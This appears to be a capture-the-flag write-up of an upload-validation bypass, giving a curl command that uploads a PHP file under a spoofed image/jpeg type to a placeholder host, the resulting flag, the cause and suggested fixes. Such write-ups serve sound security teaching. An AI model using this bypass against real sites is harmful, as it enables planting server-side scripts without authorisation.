# Proof of Concept

The upload validation can be bypassed by changing the uploaded file's MIME type to image/jpeg:

echo '<?php echo "I am bad" ?>' > /tmp/bad.php
curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/bad.php;type=image/jpeg" \
"http://x.x.x.x/index.php?page=upload" | grep 'flag'

We get the following flag : **46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8**

# Explanation

The application trusts the client-supplied Content-Type instead of validating the actual file contents, allowing a PHP file to be uploaded as a JPEG.

# Solutions
- Validate the actual file contents server-side.
- Use an allowlist of permitted file types.
- Rename uploaded files and prevent script execution.
- Store uploads outside the web root when possible.